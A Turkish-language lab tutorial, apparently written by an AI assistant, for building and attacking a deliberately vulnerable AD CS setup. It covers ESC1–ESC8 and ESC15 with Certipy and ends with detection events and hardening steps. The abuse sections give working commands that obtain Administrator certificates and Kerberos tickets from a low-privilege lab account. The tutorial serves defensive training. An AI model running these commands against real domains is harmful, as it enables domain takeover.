@@ -1,0 +1,949 @@
+Aşağıdaki rota **izole lab / yetkili AD CS eğitimi** içindir. Senin mevcut bilgilerle varsayımım:
+
+```text
+Domain  : ndrpoc.local
+DC IP   : 192.168.39.143
+Low user: ndrpoc.local\turing
+Password: Password3#
+Kali    : attack/recon makinesi
+```
+
+AD CS tarafında önce **ESC1–ESC8**, sonra **ESC9–ESC16**, en sonda özellikle **ESC15 / EKUwu / CVE-2024-49019** çalışmanı öneririm. Certipy, AD CS enumeration ve abuse için ESC1–ESC16 yollarını destekleyen bir araçtır; AD CS certificate template’leri ise yalnızca Enterprise CA tarafından template bazlı verilir ve template bilgileri AD DS içinde tutulur. ([GitHub][1])
+
+---
+
+# 0. Lab önkoşulları
+
+## Minimum topoloji
+
+```text
+DC01      192.168.39.143   Domain Controller / DNS
+CA01      aynı DC veya ayrı member server
+KALI      senin Kali makinen
+CLIENT01  opsiyonel Windows workstation
+```
+
+Tek sunuculu lab için AD CS’yi DC üzerine kurabilirsin. Gerçek ortamda önerilmez ama eğitim lab’ı için pratik olur.
+
+## AD tarafında gerekli roller
+
+CA sunucusunda, Domain Admin / Enterprise Admin ile PowerShell aç:
+
+```powershell
+Install-WindowsFeature -Name ADCS-Cert-Authority -IncludeManagementTools
+```
+
+Enterprise Root CA kur:
+
+```powershell
+Install-AdcsCertificationAuthority `
+  -CAType EnterpriseRootCA `
+  -CACommonName "NDRPOC-CA" `
+  -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
+  -KeyLength 2048 `
+  -HashAlgorithmName SHA256 `
+  -ValidityPeriod Years `
+  -ValidityPeriodUnits 5 `
+  -Force
+```
+
+Microsoft’un AD CS kurulum dokümanı PowerShell ile `Install-WindowsFeature -Name ADCS-Cert-Authority -IncludeManagementTools` ve ardından `Install-AdcsCertificationAuthority -CAType EnterpriseRootCA` akışını gösterir. ([Microsoft Learn][2])
+
+## ESC8 için ek rol
+
+ESC8 yani Web Enrollment / NTLM relay senaryosu için ayrıca:
+
+```powershell
+Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools
+Install-AdcsWebEnrollment -Force
+```
+
+ESC8’i çalışacaksan lab snapshot al. Bu kısım NDR tarafında çok görünürdür.
+
+---
+
+# 1. Kali tool hazırlığı
+
+Kali’de:
+
+```bash
+sudo apt update
+sudo apt install -y certipy-ad bloodhound.py ldapdomaindump smbclient krb5-user
+pipx install netexec
+pipx install impacket
+```
+
+Test:
+
+```bash
+certipy -h
+nxc -h
+GetUserSPNs.py -h
+```
+
+DNS çözümleme için `/etc/hosts` içine ekle:
+
+```bash
+sudo nano /etc/hosts
+```
+
+```text
+192.168.39.143 dc01.ndrpoc.local ndrpoc.local
+```
+
+Kerberos saat farkı sorun çıkarmasın diye:
+
+```bash
+sudo ntpdate -u 192.168.39.143
+```
+
+---
+
+# 2. AD CS genel recon
+
+İlk hedefin şu sorulara cevap bulmak:
+
+```text
+CA var mı?
+CA adı ne?
+Hangi certificate template’ler published?
+Hangi template’lerde Domain Users / Authenticated Users Enroll hakkına sahip?
+Subject Alternative Name kullanıcı tarafından verilebiliyor mu?
+Client Authentication / Any Purpose / Certificate Request Agent EKU var mı?
+Manager approval gerekiyor mu?
+ESC1–ESC16 bulgusu var mı?
+```
+
+## Certipy temel recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -dns-tcp \
+  -text \
+  -json \
+  -bloodhound \
+  -output adcs-ndrpoc-full
+```
+
+Sadece zafiyetleri görmek için:
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -dns-tcp \
+  -vulnerable \
+  -text \
+  -output adcs-ndrpoc-vulnerable
+```
+
+Çıktılarda özellikle şunları ara:
+
+```text
+ESC1
+ESC2
+ESC3
+ESC4
+ESC6
+ESC7
+ESC8
+ESC9
+ESC15
+Certificate Authorities
+Certificate Templates
+Enrollment Rights
+Client Authentication
+Any Purpose
+Enrollee Supplies Subject
+Requires Manager Approval
+```
+
+---
+
+# 3. CA audit/log hazırlığı
+
+NDR yanında Windows event tarafını da görmek için CA üzerinde audit aç:
+
+```powershell
+auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
+certutil -setreg CA\AuditFilter 127
+Restart-Service CertSvc
+```
+
+Takip edeceğin temel event’ler:
+
+```text
+4886 - Certificate Services received a certificate request
+4887 - Certificate Services approved and issued a certificate
+4888 - Certificate Services denied a certificate request
+4889 - Certificate Services set request status to pending
+4768 - Kerberos TGT request
+4769 - Kerberos service ticket request
+4624 - Network logon
+```
+
+Microsoft’un gelişmiş audit dokümantasyonu, “Audit Certification Services” politikasının AD CS işlemleri için olay ürettiğini; örnek olarak certificate request, issue ve revoke işlemlerini kapsadığını belirtir. ([Microsoft Learn][3])
+
+---
+
+# 4. ESC1 lab: en temel ve en öğretici senaryo
+
+ESC1, düşük yetkili kullanıcının certificate template üzerinden başka bir kullanıcı adına SAN/UPN yazarak sertifika alabilmesi durumudur. Certipy dokümantasyonu ESC1’i, düşük yetkili kullanıcının arbitrary SAN ile admin dahil başka kullanıcıları impersonate edebilmesine yol açan klasik AD CS misconfiguration olarak açıklar. ([GitHub][4])
+
+## AD tarafında template oluştur
+
+CA/DC üzerinde:
+
+```powershell
+certtmpl.msc
+```
+
+Adımlar:
+
+```text
+1. Certificate Templates Console aç.
+2. User template üzerine sağ tıkla.
+3. Duplicate Template seç.
+4. General:
+   Template display name: ESC1-User-SAN
+   Template name        : ESC1-User-SAN
+5. Subject Name:
+   Supply in the request seç.
+6. Extensions:
+   Application Policies içinde Client Authentication olduğundan emin ol.
+7. Security:
+   Domain Users veya Authenticated Users:
+     Read
+     Enroll
+8. Issuance Requirements:
+   CA certificate manager approval kapalı olsun.
+   Authorized signatures gerekmesin.
+9. Apply / OK.
+```
+
+Template’i CA üzerinde publish et:
+
+```text
+certsrv.msc
+Certification Authority > NDRPOC-CA > Certificate Templates
+Right click > New > Certificate Template to Issue
+ESC1-User-SAN seç
+```
+
+## Kali’den recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc1-check
+```
+
+Çıktıda şuna benzer şeyler ararsın:
+
+```text
+Template Name              : ESC1-User-SAN
+Enrollment Rights          : Domain Users
+Client Authentication      : True
+Enrollee Supplies Subject  : True
+Requires Manager Approval  : False
+Vulnerabilities            : ESC1
+```
+
+## Kali’den abuse
+
+Önce CA adını öğren:
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -stdout
+```
+
+CA adı genelde şöyle görünür:
+
+```text
+CA Name : NDRPOC-CA
+```
+
+Administrator adına sertifika iste:
+
+```bash
+certipy req \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -ca 'NDRPOC-CA' \
+  -template 'ESC1-User-SAN' \
+  -upn administrator@ndrpoc.local \
+  -out esc1-administrator
+```
+
+Sertifikayla kimlik doğrula:
+
+```bash
+certipy auth \
+  -pfx esc1-administrator.pfx \
+  -dc-ip 192.168.39.143 \
+  -domain ndrpoc.local
+```
+
+Başarılı olursa lab’da şu sonucu görürsün:
+
+```text
+Got TGT
+Saved credential cache
+NT hash elde edilebilir
+```
+
+Burada amaç domain takeover zincirini büyütmek değil; **AD CS misconfiguration → sertifika ile impersonation → Kerberos auth** etkisini doğrulamak.
+
+---
+
+# 5. ESC2 lab: Any Purpose / No EKU template
+
+ESC2 mantığı: template, sertifikayı çok geniş amaçlar için kullanılabilir hale getirir. Özellikle **Any Purpose EKU** veya bazı durumlarda EKU’suz template risklidir.
+
+## AD tarafında
+
+```text
+1. User template’i duplicate et.
+2. Name: ESC2-AnyPurpose
+3. Extensions > Application Policies:
+   Any Purpose ekle.
+4. Security:
+   Domain Users: Read + Enroll
+5. Manager approval kapalı.
+6. Template’i CA’da publish et.
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc2-check
+```
+
+## Abuse doğrulama
+
+```bash
+certipy req \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -ca 'NDRPOC-CA' \
+  -template 'ESC2-AnyPurpose' \
+  -out esc2-turing
+```
+
+Bu senaryoda doğrudan Administrator impersonation her zaman ESC1 kadar düz olmayabilir. Asıl öğrenmen gereken şey: **template’in kullanım amacı gereğinden geniş mi?**
+
+---
+
+# 6. ESC3 lab: Enrollment Agent
+
+ESC3, bir kullanıcının **Certificate Request Agent** sertifikası alıp başka kullanıcı adına sertifika talep edebilmesiyle ilgilidir.
+
+## AD tarafında
+
+İki template gerekir.
+
+### 6.1 Enrollment Agent template
+
+```text
+1. Enrollment Agent template’i duplicate et.
+2. Name: ESC3-Agent
+3. Application Policies:
+   Certificate Request Agent
+4. Security:
+   Domain Users: Read + Enroll
+5. Manager approval kapalı.
+6. Publish et.
+```
+
+### 6.2 On-behalf-of için User template
+
+```text
+1. User template’i duplicate et.
+2. Name: ESC3-User
+3. Client Authentication açık olsun.
+4. Enrollment Agent restrictions zayıf bırakılırsa lab daha kolay olur.
+5. Publish et.
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc3-check
+```
+
+## Abuse
+
+Önce agent sertifikası al:
+
+```bash
+certipy req \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -ca 'NDRPOC-CA' \
+  -template 'ESC3-Agent' \
+  -out esc3-agent
+```
+
+Sonra Administrator adına sertifika iste:
+
+```bash
+certipy req \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -ca 'NDRPOC-CA' \
+  -template 'ESC3-User' \
+  -on-behalf-of 'ndrpoc\administrator' \
+  -pfx esc3-agent.pfx \
+  -out esc3-administrator
+```
+
+Auth:
+
+```bash
+certipy auth \
+  -pfx esc3-administrator.pfx \
+  -dc-ip 192.168.39.143 \
+  -domain ndrpoc.local
+```
+
+---
+
+# 7. ESC4 lab: template ACL abuse
+
+ESC4 mantığı: düşük yetkili kullanıcı certificate template üzerinde **WriteDACL / WriteOwner / GenericAll / WriteProperty** gibi haklara sahipse template’i ESC1’e çevirebilir.
+
+## AD tarafında
+
+```text
+1. Güvenli bir User duplicate template oluştur:
+   Name: ESC4-WeakACL
+2. Başta Supply in request kapalı olsun.
+3. Security tab:
+   turing kullanıcısına veya bir gruba template üzerinde WriteDACL/WriteOwner/Full Control ver.
+4. Template’i publish et.
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc4-check
+```
+
+## Abuse mantığı
+
+Burada zincir şudur:
+
+```text
+turing template üzerinde yazma hakkına sahip
+→ template ayarlarını değiştirir
+→ Supply in request açılır
+→ Client Authentication eklenir
+→ Domain Users enroll hakkı korunur
+→ ESC1 gibi abuse edilir
+```
+
+Certipy ile template konfigürasyonu yedekleyip değiştirme akışı kullanılır:
+
+```bash
+certipy template \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -template ESC4-WeakACL \
+  -save-old
+```
+
+Sonra template’i ESC1 gibi kötü yapılandırıp tekrar `certipy req` ile test edersin.
+
+---
+
+# 8. ESC5 lab: PKI object / AD object ACL abuse
+
+ESC5 daha geniş bir kategoridir. Template değil, AD CS ile ilişkili AD objelerinde hatalı ACL olmasıdır.
+
+Örnek lab fikirleri:
+
+```text
+CN=Public Key Services
+CN=Certificate Templates
+CN=Certification Authorities
+CN=Enrollment Services
+CA computer object
+PKI-related groups
+```
+
+## AD tarafında lab için kolay yol
+
+```text
+1. ADSIEdit aç.
+2. Configuration partition’a git.
+3. Services > Public Key Services altında bir PKI objesi seç.
+4. turing kullanıcısına yazma hakkı ver.
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc5-check
+```
+
+ESC5’i öğrenirken odak şu olmalı:
+
+```text
+Template ayarı güvenli olsa bile PKI AD objelerinin ACL’i kötü ise AD CS zinciri bozulabilir.
+```
+
+---
+
+# 9. ESC6 lab: CA SAN flag abuse
+
+ESC6, CA üzerinde `EDITF_ATTRIBUTESUBJECTALTNAME2` gibi bir ayarın açılmasıyla ilgilidir. Bu ayar açıksa requester, bazı template koşullarında SAN attribute gönderebilir.
+
+## AD tarafında CA ayarı
+
+CA üzerinde admin PowerShell:
+
+```powershell
+certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+Restart-Service CertSvc
+```
+
+Template:
+
+```text
+1. User template duplicate et.
+2. Name: ESC6-User
+3. Client Authentication açık.
+4. Domain Users: Read + Enroll.
+5. Subject Name normal kalsın.
+6. Publish et.
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc6-check
+```
+
+## Abuse
+
+```bash
+certipy req \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -ca 'NDRPOC-CA' \
+  -template 'ESC6-User' \
+  -upn administrator@ndrpoc.local \
+  -out esc6-administrator
+```
+
+Auth:
+
+```bash
+certipy auth \
+  -pfx esc6-administrator.pfx \
+  -dc-ip 192.168.39.143 \
+  -domain ndrpoc.local
+```
+
+Lab sonrası düzelt:
+
+```powershell
+certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+Restart-Service CertSvc
+```
+
+---
+
+# 10. ESC7 lab: CA permission abuse
+
+ESC7, kullanıcının CA üzerinde **Manage CA** veya **Manage Certificates** gibi fazla yetkiye sahip olmasıdır.
+
+## AD tarafında
+
+```text
+1. certsrv.msc aç.
+2. CA üzerine sağ tık > Properties.
+3. Security tab.
+4. turing kullanıcısını ekle.
+5. Manage CA veya Issue and Manage Certificates ver.
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc7-check
+```
+
+## Lab abuse mantığı
+
+ESC7’de genelde şu etkileri test edersin:
+
+```text
+CA ayarlarını değiştirebilme
+pending request approve edebilme
+template issue/publish zincirini etkileyebilme
+ESC6 benzeri ayarları aktive edebilme
+```
+
+Bu senaryo NDR’dan çok Windows event ve CA audit tarafında değerlidir.
+
+---
+
+# 11. ESC8 lab: AD CS Web Enrollment / NTLM relay
+
+ESC8, AD CS HTTP enrollment endpoint’lerine NTLM relay yapılabilmesiyle ilgilidir. Bu, AD CS Web Enrollment veya Certificate Enrollment Web Service kullanılıyorsa özellikle önemlidir. Microsoft, AD CS Web Enrollment / Certificate Enrollment Web Service kullanan ortamların NTLM relay riskini azaltmak için EPA/channel binding gibi önlemlerden bahseder. ([Black Hills Information Security, Inc.][5])
+
+## AD tarafında
+
+```powershell
+Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools
+Install-AdcsWebEnrollment -Force
+```
+
+Kontrol:
+
+```text
+http://ca01.ndrpoc.local/certsrv/
+```
+
+veya DC üzerinde kurduysan:
+
+```text
+http://dc01.ndrpoc.local/certsrv/
+```
+
+## Recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -vulnerable \
+  -text \
+  -output esc8-check
+```
+
+## Lab attack mantığı
+
+ESC8 zinciri:
+
+```text
+1. AD CS HTTP enrollment endpoint açık.
+2. NTLM authentication kabul ediliyor.
+3. EPA/channel binding yok veya zayıf.
+4. Lab içindeki bir makineden NTLM auth alınır.
+5. Bu auth AD CS endpoint’ine relay edilir.
+6. Hedef adına certificate alınır.
+```
+
+Bu senaryoyu sadece izole lab’da çalıştır. NDR’da en net görülecek davranışlardan biridir:
+
+```text
+SMB/HTTP NTLM authentication
+Relay host davranışı
+AD CS HTTP enrollment request
+Certificate issue eventleri
+```
+
+---
+
+# 12. ESC9–ESC16 için çalışma sırası
+
+Bunlar daha modern ve çoğu zaman patch / mapping / CA ayarı / object attribute ilişkisine bağlıdır. Önce hepsini tek tek “detect” et, sonra lab’da yalnızca birini aç.
+
+## Genel recon
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -dns-tcp \
+  -vulnerable \
+  -text \
+  -json \
+  -output esc9-esc16-check
+```
+
+## Kısa özet
+
+| ESC   | Lab’da neyi temsil eder?                         | Önkoşul                              |
+| ----- | ------------------------------------------------ | ------------------------------------ |
+| ESC9  | Weak certificate mapping / no security extension | Mapping ve template ayarları         |
+| ESC10 | Weak certificate mapping policy                  | DC certificate mapping ayarı         |
+| ESC11 | RPC enrollment encryption zayıflığı              | CA RPC enrollment ayarı              |
+| ESC12 | CA private key / YubiHSM ilişkili senaryolar     | CA server üzerinde özel durum        |
+| ESC13 | Certificate template linked group/OID abuse      | Template + group link ilişkisi       |
+| ESC14 | Explicit certificate mapping abuse               | AD object mapping attribute          |
+| ESC15 | EKUwu / application policy injection             | Unpatched AD CS + schema v1 template |
+| ESC16 | Security extension disabled / mapping bypass     | Modern mapping ayarları              |
+
+Certipy wiki, 2025 itibarıyla ESC1–ESC16 için misconfiguration’ların düşük yetkili kullanıcıdan privilege escalation’a gidebildiğini ve bazı saldırıların zincir gerektirdiğini belirtir. ([GitHub][4])
+
+---
+
+# 13. ESC15 / EKUwu özel lab
+
+ESC15, özellikle çalışmak istediğin modern senaryo. Burada kritik nokta şu:
+
+**ESC15, CVE-2024-49019 ile ilişkilidir ve Microsoft tarafından Kasım 2024’te patch edilmiştir.** NVD bunu “Active Directory Certificate Services Elevation of Privilege Vulnerability” olarak listeler; Microsoft CVSS 3.1 skorunu 7.8 High olarak vermiştir. ([NVD][6])
+
+SpecterOps açıklamasına göre ESC15, **schema version 1 certificate template** üzerinde certificate request içine application policy extension enjekte edilmesiyle EKU kısıtlarının aşılmasıdır. Aynı kaynak, saldırı senaryosu olarak `Client Authentication` application policy enjekte edilip ESC1 benzeri abuse yapılabileceğini veya `Certificate Request Agent` application policy enjekte edilip ESC3 benzeri akışa gidilebileceğini belirtir. ([docs.specterops.io][7])
+
+## ESC15 için lab önkoşulları
+
+```text
+1. AD CS Enterprise CA kurulu.
+2. CA/DC, CVE-2024-49019 patch’i uygulanmamış snapshot’ta olmalı.
+3. Schema version 1 certificate template kullanılmalı.
+4. Template requester’a subject/SAN supply imkanı vermeli.
+5. turing kullanıcısının ilgili template üzerinde Enroll hakkı olmalı.
+6. Template normalde Client Authentication içermemeli; injection ile eklenecek.
+```
+
+Microsoft certificate template dokümanı, Version 1 template’lerin Windows 2000’den beri gelen default template’ler olduğunu ve yalnızca permission set’inin değiştirilebildiğini açıklar. Bu ESC15 için önemlidir çünkü zafiyet schema version 1 template davranışına dayanır. ([Microsoft Learn][8])
+
+## ESC15 için template hazırlığı
+
+ESC15 için en pratik lab template’i genelde **WebServer** gibi schema v1 bir template üzerinden düşünülür.
+
+AD tarafında:
+
+```text
+1. certtmpl.msc aç.
+2. Schema Version 1 olan bir template seç.
+   Örnek: Web Server
+3. Template permissions kısmında:
+   turing veya Domain Users için Read + Enroll ver.
+4. Template published olsun.
+5. CA üzerinde template’i issue et:
+   certsrv.msc > Certificate Templates > New > Certificate Template to Issue
+```
+
+Not: Version 1 template’lerde ayar değiştirme alanları sınırlıdır. Bu nedenle ESC15 lab’ında “doğru eski template + enrollment hakkı + unpatched CA” üçlüsü önemlidir.
+
+## ESC15 recon
+
+Kali’den:
+
+```bash
+certipy find \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -dns-tcp \
+  -vulnerable \
+  -text \
+  -output esc15-check
+```
+
+Çıktıda şuna benzer bulgu ararsın:
+
+```text
+ESC15
+Schema Version: 1
+Enrollment Rights: turing / Domain Users / Authenticated Users
+Application Policy Injection possible
+```
+
+## ESC15 abuse mantığı
+
+Zincir şudur:
+
+```text
+turing düşük yetkili kullanıcıdır
+→ schema v1 template üzerinde Enroll hakkı vardır
+→ request içine application policy eklenir
+→ Client Authentication policy enjekte edilir
+→ Administrator UPN/SAN ile certificate alınır
+→ certificate ile Kerberos auth denenir
+```
+
+Certipy sürümüne göre syntax değişebilir. Mantıksal akış şu şekildedir:
+
+```bash
+certipy req \
+  -u turing@ndrpoc.local \
+  -p 'Password3#' \
+  -dc-ip 192.168.39.143 \
+  -ca 'NDRPOC-CA' \
+  -template 'WebServer' \
+  -upn administrator@ndrpoc.local \
+  -application-policies 'Client Authentication' \
+  -out esc15-administrator
+```
+
+Sonra:
+
+```bash
+certipy auth \
+  -pfx esc15-administrator.pfx \
+  -dc-ip 192.168.39.143 \
+  -domain ndrpoc.local
+```
+
+Başarılı test göstergesi:
+
+```text
+Certificate issued
+PFX saved
+Kerberos TGT obtained
+4768 event oluştu
+4886/4887 certificate request/issue eventleri oluştu
+NDR’da Kali → CA/DC AD CS enrollment trafiği görüldü
+```
+
+Başarısız olursa muhtemel nedenler:
+
+```text
+CA patched olabilir.
+Template schema version 1 değildir.
+Template published değildir.
+turing Enroll hakkına sahip değildir.
+CA adı yanlış yazılmıştır.
+Client Authentication injection Certipy sürümünde farklı parametreyle yapılır.
+Strong certificate mapping davranışı auth aşamasını engelliyor olabilir.
+```
+
+---
+
+# 14. Her ESC için pratik lab sırası
+
+Ben senin lab’da şu sırayla ilerlerdim:
+
+```text
+1. AD CS kur.
+2. Certipy find ile temiz baseline al.
+3. ESC1 template oluştur.
+4. Recon → abuse → auth → event kontrol.
+5. ESC3 Enrollment Agent oluştur.
+6. Recon → abuse → auth → event kontrol.
+7. ESC4 ACL abuse oluştur.
+8. Recon → template modify → ESC1’e çevir → abuse.
+9. ESC6 CA SAN flag aç.
+10. Recon → abuse → flag’i geri kapat.
+11. ESC7 CA permission abuse.
+12. ESC8 Web Enrollment kur → relay yüzeyini gözlemle.
+13. ESC9–ESC16 için Certipy vulnerable output incele.
+14. ESC15 için unpatched snapshot’a geç.
+15. Schema v1 template + Enroll hakkı ile ESC15 test et.
+16. Tüm template ve CA ayarlarını hardening checklist ile kapat.
+```
+
+---
+
+# 15. NDR/SIEM tarafında beklenen sinyaller
+
+Bu lab’da Vectra/Darktrace tarafında şunları aramalısın:
+
+```text
+Kali → DC LDAP enumeration
+Kali → CA/DC certificate template enumeration
+Kali → CA certificate request burst
+Kali → DC Kerberos PKINIT/authentication attempt
+Low-priv user requesting unusual certificate template
+Certificate request with Administrator UPN/SAN
+Web Enrollment varsa HTTP NTLM authentication
+ESC8 varsa relay-benzeri authentication pattern
+```
+
+Windows event tarafında:
+
+```text
+4886 - Certificate request geldi
+4887 - Certificate issued
+4888 - Certificate denied
+4889 - Request pending
+4768 - TGT request
+4769 - Service ticket request
+4624 - Network logon
+```
+
+---
+
+# 16. Lab sonrası hardening kontrol listesi
+
+Her senaryodan sonra template’i veya CA ayarını geri al:
+
+```text
+Domain Users / Authenticated Users Enroll haklarını kaldır.
+Supply in request kapat.
+Client Authentication EKU’sunu sadece gerekli template’lerde bırak.
+Any Purpose EKU kullanma.
+Enrollment Agent template’lerini publish etme veya çok kısıtlı tut.
+CA üzerinde Manage CA / Manage Certificates haklarını minimuma indir.
+EDITF_ATTRIBUTESUBJECTALTNAME2 kapat.
+AD CS Web Enrollment kullanmıyorsan kaldır.
+EPA/channel binding uygula.
+ESC15 için CVE-2024-49019 patch seviyesini doğrula.
+Certipy find -vulnerable ile tekrar kontrol et.
+```
+
+Microsoft’un güncel AD CS hardening rehberi; offline root CA, doğru audit, rol ayrımı ve template/permission temizliğini dört kritik odak alanı olarak vurgular. ([TECHCOMMUNITY.MICROSOFT.COM][9])
+
+En iyi başlangıç: önce **ESC1** kur, `certipy find` ile bul, `certipy req` ile sertifika al, `certipy auth` ile etkisini doğrula. Sonra aynı mantığı **ESC3 → ESC4 → ESC6 → ESC15** sırasıyla genişlet.
+
+[1]: https://github.com/ly4k/Certipy "GitHub - ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse · GitHub"
+[2]: https://learn.microsoft.com/en-us/windows-server/networking/core-network-guide/cncg/server-certs/install-the-certification-authority?utm_source=chatgpt.com "Install the Certification Authority on Windows Server"
+[3]: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/advanced-audit-policy-configuration?utm_source=chatgpt.com "Advanced Audit Policy Configuration settings"
+[4]: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation "06 ‐ Privilege Escalation · ly4k/Certipy Wiki · GitHub"
+[5]: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/?utm_source=chatgpt.com "Abusing Active Directory Certificate Services (Part 3)"
+[6]: https://nvd.nist.gov/vuln/detail/cve-2024-49019 "NVD - cve-2024-49019"
+[7]: https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc15-ekuwu-application-policy-injection "ESC15 - EKUwu (Application Policy Injection) - SpecterOps Open Source"
+[8]: https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts "Certificate template concepts in Windows Server | Microsoft Learn"
+[9]: https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/secure-configuration-and-hardening-of-active-directory-certificate-services/4463240 "Secure Configuration and Hardening of Active Directory Certificate Services | Microsoft Community Hub"
